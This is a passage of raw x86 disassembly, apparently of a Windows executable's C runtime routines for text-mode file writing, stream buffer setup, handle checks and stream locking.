  40d767:	cc                   	int3
  40d768:	cc                   	int3
  40d769:	cc                   	int3
  40d76a:	cc                   	int3
  40d76b:	cc                   	int3
  40d76c:	cc                   	int3
  40d76d:	cc                   	int3
  40d76e:	cc                   	int3
  40d76f:	cc                   	int3
  40d770:	55                   	push   %ebp
  40d771:	8b ec                	mov    %esp,%ebp
  40d773:	81 ec 20 04 00 00    	sub    $0x420,%esp
  40d779:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  40d780:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40d783:	89 85 e0 fb ff ff    	mov    %eax,-0x420(%ebp)
  40d789:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  40d78d:	75 07                	jne    0x40d796
  40d78f:	33 c0                	xor    %eax,%eax
  40d791:	e9 49 02 00 00       	jmp    0x40d9df
  40d796:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40d799:	c1 f9 05             	sar    $0x5,%ecx
  40d79c:	8b 55 08             	mov    0x8(%ebp),%edx
  40d79f:	83 e2 1f             	and    $0x1f,%edx
  40d7a2:	6b d2 24             	imul   $0x24,%edx,%edx
  40d7a5:	8b 04 8d 60 f2 45 00 	mov    0x45f260(,%ecx,4),%eax
  40d7ac:	0f be 4c 10 04       	movsbl 0x4(%eax,%edx,1),%ecx
  40d7b1:	83 e1 20             	and    $0x20,%ecx
  40d7b4:	85 c9                	test   %ecx,%ecx
  40d7b6:	74 10                	je     0x40d7c8
  40d7b8:	6a 02                	push   $0x2
  40d7ba:	6a 00                	push   $0x0
  40d7bc:	8b 55 08             	mov    0x8(%ebp),%edx
  40d7bf:	52                   	push   %edx
  40d7c0:	e8 5b fe ff ff       	call   0x40d620
  40d7c5:	83 c4 0c             	add    $0xc,%esp
  40d7c8:	8b 45 08             	mov    0x8(%ebp),%eax
  40d7cb:	c1 f8 05             	sar    $0x5,%eax
  40d7ce:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40d7d1:	83 e1 1f             	and    $0x1f,%ecx
  40d7d4:	6b c9 24             	imul   $0x24,%ecx,%ecx
  40d7d7:	8b 14 85 60 f2 45 00 	mov    0x45f260(,%eax,4),%edx
  40d7de:	0f be 44 0a 04       	movsbl 0x4(%edx,%ecx,1),%eax
  40d7e3:	25 80 00 00 00       	and    $0x80,%eax
  40d7e8:	85 c0                	test   %eax,%eax
  40d7ea:	0f 84 0c 01 00 00    	je     0x40d8fc
  40d7f0:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40d7f3:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40d7f6:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  40d7fd:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40d800:	2b 55 0c             	sub    0xc(%ebp),%edx
  40d803:	3b 55 10             	cmp    0x10(%ebp),%edx
  40d806:	0f 83 ee 00 00 00    	jae    0x40d8fa
  40d80c:	8d 85 ec fb ff ff    	lea    -0x414(%ebp),%eax
  40d812:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40d815:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40d818:	8d 95 ec fb ff ff    	lea    -0x414(%ebp),%edx
  40d81e:	2b ca                	sub    %edx,%ecx
  40d820:	81 f9 00 04 00 00    	cmp    $0x400,%ecx
  40d826:	7d 5f                	jge    0x40d887
  40d828:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40d82b:	2b 45 0c             	sub    0xc(%ebp),%eax
  40d82e:	3b 45 10             	cmp    0x10(%ebp),%eax
  40d831:	73 54                	jae    0x40d887
  40d833:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40d836:	8a 11                	mov    (%ecx),%dl
  40d838:	88 95 e4 fb ff ff    	mov    %dl,-0x41c(%ebp)
  40d83e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40d841:	83 c0 01             	add    $0x1,%eax
  40d844:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40d847:	0f be 8d e4 fb ff ff 	movsbl -0x41c(%ebp),%ecx
  40d84e:	83 f9 0a             	cmp    $0xa,%ecx
  40d851:	75 1e                	jne    0x40d871
  40d853:	8b 95 e0 fb ff ff    	mov    -0x420(%ebp),%edx
  40d859:	83 c2 01             	add    $0x1,%edx
  40d85c:	89 95 e0 fb ff ff    	mov    %edx,-0x420(%ebp)
  40d862:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40d865:	c6 00 0d             	movb   $0xd,(%eax)
  40d868:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40d86b:	83 c1 01             	add    $0x1,%ecx
  40d86e:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40d871:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40d874:	8a 85 e4 fb ff ff    	mov    -0x41c(%ebp),%al
  40d87a:	88 02                	mov    %al,(%edx)
  40d87c:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40d87f:	83 c1 01             	add    $0x1,%ecx
  40d882:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40d885:	eb 8e                	jmp    0x40d815
  40d887:	6a 00                	push   $0x0
  40d889:	8d 95 e8 fb ff ff    	lea    -0x418(%ebp),%edx
  40d88f:	52                   	push   %edx
  40d890:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40d893:	8d 8d ec fb ff ff    	lea    -0x414(%ebp),%ecx
  40d899:	2b c1                	sub    %ecx,%eax
  40d89b:	50                   	push   %eax
  40d89c:	8d 95 ec fb ff ff    	lea    -0x414(%ebp),%edx
  40d8a2:	52                   	push   %edx
  40d8a3:	8b 45 08             	mov    0x8(%ebp),%eax
  40d8a6:	c1 f8 05             	sar    $0x5,%eax
  40d8a9:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40d8ac:	83 e1 1f             	and    $0x1f,%ecx
  40d8af:	6b c9 24             	imul   $0x24,%ecx,%ecx
  40d8b2:	8b 14 85 60 f2 45 00 	mov    0x45f260(,%eax,4),%edx
  40d8b9:	8b 04 0a             	mov    (%edx,%ecx,1),%eax
  40d8bc:	50                   	push   %eax
  40d8bd:	ff 15 a0 f0 40 00    	call   *0x40f0a0
  40d8c3:	85 c0                	test   %eax,%eax
  40d8c5:	74 23                	je     0x40d8ea
  40d8c7:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40d8ca:	03 8d e8 fb ff ff    	add    -0x418(%ebp),%ecx
  40d8d0:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40d8d3:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40d8d6:	8d 85 ec fb ff ff    	lea    -0x414(%ebp),%eax
  40d8dc:	2b d0                	sub    %eax,%edx
  40d8de:	39 95 e8 fb ff ff    	cmp    %edx,-0x418(%ebp)
  40d8e4:	7d 02                	jge    0x40d8e8
  40d8e6:	eb 12                	jmp    0x40d8fa
  40d8e8:	eb 0b                	jmp    0x40d8f5
  40d8ea:	ff 15 58 f0 40 00    	call   *0x40f058
  40d8f0:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40d8f3:	eb 05                	jmp    0x40d8fa
  40d8f5:	e9 03 ff ff ff       	jmp    0x40d7fd
  40d8fa:	eb 50                	jmp    0x40d94c
  40d8fc:	6a 00                	push   $0x0
  40d8fe:	8d 8d e8 fb ff ff    	lea    -0x418(%ebp),%ecx
  40d904:	51                   	push   %ecx
  40d905:	8b 55 10             	mov    0x10(%ebp),%edx
  40d908:	52                   	push   %edx
  40d909:	8b 45 0c             	mov    0xc(%ebp),%eax
  40d90c:	50                   	push   %eax
  40d90d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40d910:	c1 f9 05             	sar    $0x5,%ecx
  40d913:	8b 55 08             	mov    0x8(%ebp),%edx
  40d916:	83 e2 1f             	and    $0x1f,%edx
  40d919:	6b d2 24             	imul   $0x24,%edx,%edx
  40d91c:	8b 04 8d 60 f2 45 00 	mov    0x45f260(,%ecx,4),%eax
  40d923:	8b 0c 10             	mov    (%eax,%edx,1),%ecx
  40d926:	51                   	push   %ecx
  40d927:	ff 15 a0 f0 40 00    	call   *0x40f0a0
  40d92d:	85 c0                	test   %eax,%eax
  40d92f:	74 12                	je     0x40d943
  40d931:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  40d938:	8b 95 e8 fb ff ff    	mov    -0x418(%ebp),%edx
  40d93e:	89 55 f0             	mov    %edx,-0x10(%ebp)
  40d941:	eb 09                	jmp    0x40d94c
  40d943:	ff 15 58 f0 40 00    	call   *0x40f058
  40d949:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40d94c:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  40d950:	0f 85 80 00 00 00    	jne    0x40d9d6
  40d956:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  40d95a:	74 2e                	je     0x40d98a
  40d95c:	83 7d f4 05          	cmpl   $0x5,-0xc(%ebp)
  40d960:	75 17                	jne    0x40d979
  40d962:	e8 99 e7 ff ff       	call   0x40c100
  40d967:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40d96d:	e8 9e e7 ff ff       	call   0x40c110
  40d972:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40d975:	89 08                	mov    %ecx,(%eax)
  40d977:	eb 0c                	jmp    0x40d985
  40d979:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40d97c:	52                   	push   %edx
  40d97d:	e8 de e6 ff ff       	call   0x40c060
  40d982:	83 c4 04             	add    $0x4,%esp
  40d985:	83 c8 ff             	or     $0xffffffff,%eax
  40d988:	eb 55                	jmp    0x40d9df
  40d98a:	8b 45 08             	mov    0x8(%ebp),%eax
  40d98d:	c1 f8 05             	sar    $0x5,%eax
  40d990:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40d993:	83 e1 1f             	and    $0x1f,%ecx
  40d996:	6b c9 24             	imul   $0x24,%ecx,%ecx
  40d999:	8b 14 85 60 f2 45 00 	mov    0x45f260(,%eax,4),%edx
  40d9a0:	0f be 44 0a 04       	movsbl 0x4(%edx,%ecx,1),%eax
  40d9a5:	83 e0 40             	and    $0x40,%eax
  40d9a8:	85 c0                	test   %eax,%eax
  40d9aa:	74 0f                	je     0x40d9bb
  40d9ac:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40d9af:	0f be 11             	movsbl (%ecx),%edx
  40d9b2:	83 fa 1a             	cmp    $0x1a,%edx
  40d9b5:	75 04                	jne    0x40d9bb
  40d9b7:	33 c0                	xor    %eax,%eax
  40d9b9:	eb 24                	jmp    0x40d9df
  40d9bb:	e8 40 e7 ff ff       	call   0x40c100
  40d9c0:	c7 00 1c 00 00 00    	movl   $0x1c,(%eax)
  40d9c6:	e8 45 e7 ff ff       	call   0x40c110
  40d9cb:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  40d9d1:	83 c8 ff             	or     $0xffffffff,%eax
  40d9d4:	eb 09                	jmp    0x40d9df
  40d9d6:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40d9d9:	2b 85 e0 fb ff ff    	sub    -0x420(%ebp),%eax
  40d9df:	8b e5                	mov    %ebp,%esp
  40d9e1:	5d                   	pop    %ebp
  40d9e2:	c3                   	ret
  40d9e3:	cc                   	int3
  40d9e4:	cc                   	int3
  40d9e5:	cc                   	int3
  40d9e6:	cc                   	int3
  40d9e7:	cc                   	int3
  40d9e8:	cc                   	int3
  40d9e9:	cc                   	int3
  40d9ea:	cc                   	int3
  40d9eb:	cc                   	int3
  40d9ec:	cc                   	int3
  40d9ed:	cc                   	int3
  40d9ee:	cc                   	int3
  40d9ef:	cc                   	int3
  40d9f0:	55                   	push   %ebp
  40d9f1:	8b ec                	mov    %esp,%ebp
  40d9f3:	51                   	push   %ecx
  40d9f4:	53                   	push   %ebx
  40d9f5:	56                   	push   %esi
  40d9f6:	57                   	push   %edi
  40d9f7:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40d9fb:	75 1e                	jne    0x40da1b
  40d9fd:	68 c0 fd 40 00       	push   $0x40fdc0
  40da02:	6a 00                	push   $0x0
  40da04:	6a 2e                	push   $0x2e
  40da06:	68 5c fe 40 00       	push   $0x40fe5c
  40da0b:	6a 02                	push   $0x2
  40da0d:	e8 ae bb ff ff       	call   0x4095c0
  40da12:	83 c4 14             	add    $0x14,%esp
  40da15:	83 f8 01             	cmp    $0x1,%eax
  40da18:	75 01                	jne    0x40da1b
  40da1a:	cc                   	int3
  40da1b:	33 c0                	xor    %eax,%eax
  40da1d:	85 c0                	test   %eax,%eax
  40da1f:	75 d6                	jne    0x40d9f7
  40da21:	8b 0d ac de 45 00    	mov    0x45deac,%ecx
  40da27:	83 c1 01             	add    $0x1,%ecx
  40da2a:	89 0d ac de 45 00    	mov    %ecx,0x45deac
  40da30:	8b 55 08             	mov    0x8(%ebp),%edx
  40da33:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40da36:	6a 3b                	push   $0x3b
  40da38:	68 5c fe 40 00       	push   $0x40fe5c
  40da3d:	6a 02                	push   $0x2
  40da3f:	68 00 10 00 00       	push   $0x1000
  40da44:	e8 97 83 ff ff       	call   0x405de0
  40da49:	83 c4 10             	add    $0x10,%esp
  40da4c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40da4f:	89 41 08             	mov    %eax,0x8(%ecx)
  40da52:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40da55:	83 7a 08 00          	cmpl   $0x0,0x8(%edx)
  40da59:	74 1b                	je     0x40da76
  40da5b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40da5e:	8b 48 0c             	mov    0xc(%eax),%ecx
  40da61:	83 c9 08             	or     $0x8,%ecx
  40da64:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40da67:	89 4a 0c             	mov    %ecx,0xc(%edx)
  40da6a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40da6d:	c7 40 18 00 10 00 00 	movl   $0x1000,0x18(%eax)
  40da74:	eb 25                	jmp    0x40da9b
  40da76:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40da79:	8b 51 0c             	mov    0xc(%ecx),%edx
  40da7c:	83 ca 04             	or     $0x4,%edx
  40da7f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40da82:	89 50 0c             	mov    %edx,0xc(%eax)
  40da85:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40da88:	83 c1 14             	add    $0x14,%ecx
  40da8b:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40da8e:	89 4a 08             	mov    %ecx,0x8(%edx)
  40da91:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40da94:	c7 40 18 02 00 00 00 	movl   $0x2,0x18(%eax)
  40da9b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40da9e:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40daa1:	8b 42 08             	mov    0x8(%edx),%eax
  40daa4:	89 01                	mov    %eax,(%ecx)
  40daa6:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40daa9:	c7 41 04 00 00 00 00 	movl   $0x0,0x4(%ecx)
  40dab0:	5f                   	pop    %edi
  40dab1:	5e                   	pop    %esi
  40dab2:	5b                   	pop    %ebx
  40dab3:	8b e5                	mov    %ebp,%esp
  40dab5:	5d                   	pop    %ebp
  40dab6:	c3                   	ret
  40dab7:	cc                   	int3
  40dab8:	cc                   	int3
  40dab9:	cc                   	int3
  40daba:	cc                   	int3
  40dabb:	cc                   	int3
  40dabc:	cc                   	int3
  40dabd:	cc                   	int3
  40dabe:	cc                   	int3
  40dabf:	cc                   	int3
  40dac0:	55                   	push   %ebp
  40dac1:	8b ec                	mov    %esp,%ebp
  40dac3:	8b 45 08             	mov    0x8(%ebp),%eax
  40dac6:	3b 05 60 f3 45 00    	cmp    0x45f360,%eax
  40dacc:	72 04                	jb     0x40dad2
  40dace:	33 c0                	xor    %eax,%eax
  40dad0:	eb 1e                	jmp    0x40daf0
  40dad2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40dad5:	c1 f9 05             	sar    $0x5,%ecx
  40dad8:	8b 55 08             	mov    0x8(%ebp),%edx
  40dadb:	83 e2 1f             	and    $0x1f,%edx
  40dade:	6b d2 24             	imul   $0x24,%edx,%edx
  40dae1:	8b 04 8d 60 f2 45 00 	mov    0x45f260(,%ecx,4),%eax
  40dae8:	0f be 44 10 04       	movsbl 0x4(%eax,%edx,1),%eax
  40daed:	83 e0 40             	and    $0x40,%eax
  40daf0:	5d                   	pop    %ebp
  40daf1:	c3                   	ret
  40daf2:	cc                   	int3
  40daf3:	cc                   	int3
  40daf4:	cc                   	int3
  40daf5:	cc                   	int3
  40daf6:	cc                   	int3
  40daf7:	cc                   	int3
  40daf8:	cc                   	int3
  40daf9:	cc                   	int3
  40dafa:	cc                   	int3
  40dafb:	cc                   	int3
  40dafc:	cc                   	int3
  40dafd:	cc                   	int3
  40dafe:	cc                   	int3
  40daff:	cc                   	int3
  40db00:	55                   	push   %ebp
  40db01:	8b ec                	mov    %esp,%ebp
  40db03:	51                   	push   %ecx
  40db04:	83 3d 00 f0 45 00 00 	cmpl   $0x0,0x45f000
  40db0b:	75 0c                	jne    0x40db19
  40db0d:	c7 05 00 f0 45 00 00 	movl   $0x200,0x45f000
  40db14:	02 00 00 
  40db17:	eb 13                	jmp    0x40db2c
  40db19:	83 3d 00 f0 45 00 14 	cmpl   $0x14,0x45f000
  40db20:	7d 0a                	jge    0x40db2c
  40db22:	c7 05 00 f0 45 00 14 	movl   $0x14,0x45f000
  40db29:	00 00 00 
  40db2c:	68 83 00 00 00       	push   $0x83
  40db31:	68 68 fe 40 00       	push   $0x40fe68
  40db36:	6a 02                	push   $0x2
  40db38:	6a 04                	push   $0x4
  40db3a:	a1 00 f0 45 00       	mov    0x45f000,%eax
  40db3f:	50                   	push   %eax
  40db40:	e8 8b 86 ff ff       	call   0x4061d0
  40db45:	83 c4 14             	add    $0x14,%esp
  40db48:	a3 f0 df 45 00       	mov    %eax,0x45dff0
  40db4d:	83 3d f0 df 45 00 00 	cmpl   $0x0,0x45dff0
  40db54:	75 3f                	jne    0x40db95
  40db56:	c7 05 00 f0 45 00 14 	movl   $0x14,0x45f000
  40db5d:	00 00 00 
  40db60:	68 86 00 00 00       	push   $0x86
  40db65:	68 68 fe 40 00       	push   $0x40fe68
  40db6a:	6a 02                	push   $0x2
  40db6c:	6a 04                	push   $0x4
  40db6e:	8b 0d 00 f0 45 00    	mov    0x45f000,%ecx
  40db74:	51                   	push   %ecx
  40db75:	e8 56 86 ff ff       	call   0x4061d0
  40db7a:	83 c4 14             	add    $0x14,%esp
  40db7d:	a3 f0 df 45 00       	mov    %eax,0x45dff0
  40db82:	83 3d f0 df 45 00 00 	cmpl   $0x0,0x45dff0
  40db89:	75 0a                	jne    0x40db95
  40db8b:	6a 1a                	push   $0x1a
  40db8d:	e8 3e 58 ff ff       	call   0x4033d0
  40db92:	83 c4 04             	add    $0x4,%esp
  40db95:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40db9c:	eb 09                	jmp    0x40dba7
  40db9e:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40dba1:	83 c2 01             	add    $0x1,%edx
  40dba4:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40dba7:	83 7d fc 14          	cmpl   $0x14,-0x4(%ebp)
  40dbab:	7d 19                	jge    0x40dbc6
  40dbad:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40dbb0:	c1 e0 05             	shl    $0x5,%eax
  40dbb3:	05 a0 d7 45 00       	add    $0x45d7a0,%eax
  40dbb8:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40dbbb:	8b 15 f0 df 45 00    	mov    0x45dff0,%edx
  40dbc1:	89 04 8a             	mov    %eax,(%edx,%ecx,4)
  40dbc4:	eb d8                	jmp    0x40db9e
  40dbc6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40dbcd:	eb 09                	jmp    0x40dbd8
  40dbcf:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40dbd2:	83 c0 01             	add    $0x1,%eax
  40dbd5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40dbd8:	83 7d fc 03          	cmpl   $0x3,-0x4(%ebp)
  40dbdc:	7d 4a                	jge    0x40dc28
  40dbde:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40dbe1:	c1 f9 05             	sar    $0x5,%ecx
  40dbe4:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40dbe7:	83 e2 1f             	and    $0x1f,%edx
  40dbea:	6b d2 24             	imul   $0x24,%edx,%edx
  40dbed:	8b 04 8d 60 f2 45 00 	mov    0x45f260(,%ecx,4),%eax
  40dbf4:	83 3c 10 ff          	cmpl   $0xffffffff,(%eax,%edx,1)
  40dbf8:	74 1c                	je     0x40dc16
  40dbfa:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40dbfd:	c1 f9 05             	sar    $0x5,%ecx
  40dc00:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40dc03:	83 e2 1f             	and    $0x1f,%edx
  40dc06:	6b d2 24             	imul   $0x24,%edx,%edx
  40dc09:	8b 04 8d 60 f2 45 00 	mov    0x45f260(,%ecx,4),%eax
  40dc10:	83 3c 10 00          	cmpl   $0x0,(%eax,%edx,1)
  40dc14:	75 10                	jne    0x40dc26
  40dc16:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40dc19:	c1 e1 05             	shl    $0x5,%ecx
  40dc1c:	c7 81 b0 d7 45 00 ff 	movl   $0xffffffff,0x45d7b0(%ecx)
  40dc23:	ff ff ff 
  40dc26:	eb a7                	jmp    0x40dbcf
  40dc28:	8b e5                	mov    %ebp,%esp
  40dc2a:	5d                   	pop    %ebp
  40dc2b:	c3                   	ret
  40dc2c:	cc                   	int3
  40dc2d:	cc                   	int3
  40dc2e:	cc                   	int3
  40dc2f:	cc                   	int3
  40dc30:	55                   	push   %ebp
  40dc31:	8b ec                	mov    %esp,%ebp
  40dc33:	e8 98 06 00 00       	call   0x40e2d0
  40dc38:	0f be 05 14 dd 45 00 	movsbl 0x45dd14,%eax
  40dc3f:	85 c0                	test   %eax,%eax
  40dc41:	74 05                	je     0x40dc48
  40dc43:	e8 98 04 00 00       	call   0x40e0e0
  40dc48:	5d                   	pop    %ebp
  40dc49:	c3                   	ret
  40dc4a:	cc                   	int3
  40dc4b:	cc                   	int3
  40dc4c:	cc                   	int3
  40dc4d:	cc                   	int3
  40dc4e:	cc                   	int3
  40dc4f:	cc                   	int3
  40dc50:	55                   	push   %ebp
  40dc51:	8b ec                	mov    %esp,%ebp
  40dc53:	81 7d 08 a0 d7 45 00 	cmpl   $0x45d7a0,0x8(%ebp)
  40dc5a:	72 22                	jb     0x40dc7e
  40dc5c:	81 7d 08 00 da 45 00 	cmpl   $0x45da00,0x8(%ebp)
  40dc63:	77 19                	ja     0x40dc7e
  40dc65:	8b 45 08             	mov    0x8(%ebp),%eax
  40dc68:	2d a0 d7 45 00       	sub    $0x45d7a0,%eax
  40dc6d:	c1 f8 05             	sar    $0x5,%eax
  40dc70:	83 c0 1c             	add    $0x1c,%eax
  40dc73:	50                   	push   %eax
  40dc74:	e8 f7 57 ff ff       	call   0x403470
  40dc79:	83 c4 04             	add    $0x4,%esp
  40dc7c:	eb 0d                	jmp    0x40dc8b
  40dc7e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40dc81:	83 c1 20             	add    $0x20,%ecx
  40dc84:	51                   	push   %ecx
  40dc85:	ff 15 38 f0 40 00    	call   *0x40f038
  40dc8b:	5d                   	pop    %ebp
  40dc8c:	c3                   	ret
  40dc8d:	cc                   	int3
  40dc8e:	cc                   	int3
  40dc8f:	cc                   	int3
  40dc90:	55                   	push   %ebp
  40dc91:	8b ec                	mov    %esp,%ebp
  40dc93:	83 7d 08 14          	cmpl   $0x14,0x8(%ebp)
  40dc97:	7d 11                	jge    0x40dcaa
  40dc99:	8b 45 08             	mov    0x8(%ebp),%eax
  40dc9c:	83 c0 1c             	add    $0x1c,%eax
  40dc9f:	50                   	push   %eax
  40dca0:	e8 cb 57 ff ff       	call   0x403470
  40dca5:	83 c4 04             	add    $0x4,%esp
  40dca8:	eb 0d                	jmp    0x40dcb7
  40dcaa:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40dcad:	83 c1 20             	add    $0x20,%ecx
  40dcb0:	51                   	push   %ecx
  40dcb1:	ff 15 38 f0 40 00    	call   *0x40f038
  40dcb7:	5d                   	pop    %ebp
  40dcb8:	c3                   	ret
  40dcb9:	cc                   	int3
  40dcba:	cc                   	int3
  40dcbb:	cc                   	int3
  40dcbc:	cc                   	int3
  40dcbd:	cc                   	int3
  40dcbe:	cc                   	int3
  40dcbf:	cc                   	int3
  40dcc0:	55                   	push   %ebp
  40dcc1:	8b ec                	mov    %esp,%ebp
  40dcc3:	81 7d 08 a0 d7 45 00 	cmpl   $0x45d7a0,0x8(%ebp)
  40dcca:	72 22                	jb     0x40dcee
  40dccc:	81 7d 08 00 da 45 00 	cmpl   $0x45da00,0x8(%ebp)
  40dcd3:	77 19                	ja     0x40dcee
  40dcd5:	8b 45 08             	mov    0x8(%ebp),%eax
  40dcd8:	2d a0 d7 45 00       	sub    $0x45d7a0,%eax
  40dcdd:	c1 f8 05             	sar    $0x5,%eax
  40dce0:	83 c0 1c             	add    $0x1c,%eax
  40dce3:	50                   	push   %eax
  40dce4:	e8 27 58 ff ff       	call   0x403510
  40dce9:	83 c4 04             	add    $0x4,%esp
  40dcec:	eb 0d                	jmp    0x40dcfb
  40dcee:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40dcf1:	83 c1 20             	add    $0x20,%ecx
  40dcf4:	51                   	push   %ecx
  40dcf5:	ff 15 3c f0 40 00    	call   *0x40f03c
  40dcfb:	5d                   	pop    %ebp
  40dcfc:	c3                   	ret
  40dcfd:	cc                   	int3
  40dcfe:	cc                   	int3
  40dcff:	cc                   	int3
  40dd00:	55                   	push   %ebp
  40dd01:	8b ec                	mov    %esp,%ebp
  40dd03:	83 7d 08 14          	cmpl   $0x14,0x8(%ebp)
  40dd07:	7d 11                	jge    0x40dd1a
  40dd09:	8b 45 08             	mov    0x8(%ebp),%eax
  40dd0c:	83 c0 1c             	add    $0x1c,%eax
  40dd0f:	50                   	push   %eax
  40dd10:	e8 fb 57 ff ff       	call   0x403510
  40dd15:	83 c4 04             	add    $0x4,%esp
  40dd18:	eb 0d                	jmp    0x40dd27
  40dd1a:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40dd1d:	83 c1 20             	add    $0x20,%ecx
  40dd20:	51                   	push   %ecx
  40dd21:	ff 15 3c f0 40 00    	call   *0x40f03c
  40dd27:	5d                   	pop    %ebp
  40dd28:	c3                   	ret
  40dd29:	cc                   	int3
  40dd2a:	cc                   	int3
  40dd2b:	cc                   	int3
  40dd2c:	cc                   	int3
  40dd2d:	cc                   	int3
  40dd2e:	cc                   	int3
  40dd2f:	cc                   	int3
  40dd30:	55                   	push   %ebp
  40dd31:	8b ec                	mov    %esp,%ebp
  40dd33:	83 ec 08             	sub    $0x8,%esp
  40dd36:	68 08 f0 45 00       	push   $0x45f008
  40dd3b:	ff 15 c4 f0 40 00    	call   *0x40f0c4
  40dd41:	83 3d 04 f0 45 00 00 	cmpl   $0x0,0x45f004
  40dd48:	74 1e                	je     0x40dd68
  40dd4a:	68 08 f0 45 00       	push   $0x45f008
  40dd4f:	ff 15 bc f0 40 00    	call   *0x40f0bc
  40dd55:	6a 13                	push   $0x13
  40dd57:	e8 14 57 ff ff       	call   0x403470
  40dd5c:	83 c4 04             	add    $0x4,%esp
  40dd5f:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40dd66:	eb 07                	jmp    0x40dd6f
  40dd68:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40dd6f:	66 8b 45 0c          	mov    0xc(%ebp),%ax
  40dd73:	50                   	push   %eax
  40dd74:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40dd77:	51                   	push   %ecx
  40dd78:	e8 33 00 00 00       	call   0x40ddb0
  40dd7d:	83 c4 08             	add    $0x8,%esp
  40dd80:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40dd83:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40dd87:	74 0c                	je     0x40dd95
  40dd89:	6a 13                	push   $0x13
  40dd8b:	e8 80 57 ff ff       	call   0x403510
  40dd90:	83 c4 04             	add    $0x4,%esp
  40dd93:	eb 0b                	jmp    0x40dda0
  40dd95:	68 08 f0 45 00       	push   $0x45f008
  40dd9a:	ff 15 bc f0 40 00    	call   *0x40f0bc
  40dda0:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40dda3:	8b e5                	mov    %ebp,%esp
  40dda5:	5d                   	pop    %ebp
  40dda6:	c3                   	ret
  40dda7:	cc                   	int3
  40dda8:	cc                   	int3
  40dda9:	cc                   	int3
  40ddaa:	cc                   	int3
  40ddab:	cc                   	int3
  40ddac:	cc                   	int3
  40ddad:	cc                   	int3
  40ddae:	cc                   	int3
  40ddaf:	cc                   	int3
  40ddb0:	55                   	push   %ebp
  40ddb1:	8b ec                	mov    %esp,%ebp
  40ddb3:	83 ec 08             	sub    $0x8,%esp
  40ddb6:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40ddba:	75 07                	jne    0x40ddc3
  40ddbc:	33 c0                	xor    %eax,%eax
  40ddbe:	e9 89 00 00 00       	jmp    0x40de4c
  40ddc3:	83 3d 80 de 45 00 00 	cmpl   $0x0,0x45de80
  40ddca:	75 2e                	jne    0x40ddfa
  40ddcc:	8b 45 0c             	mov    0xc(%ebp),%eax
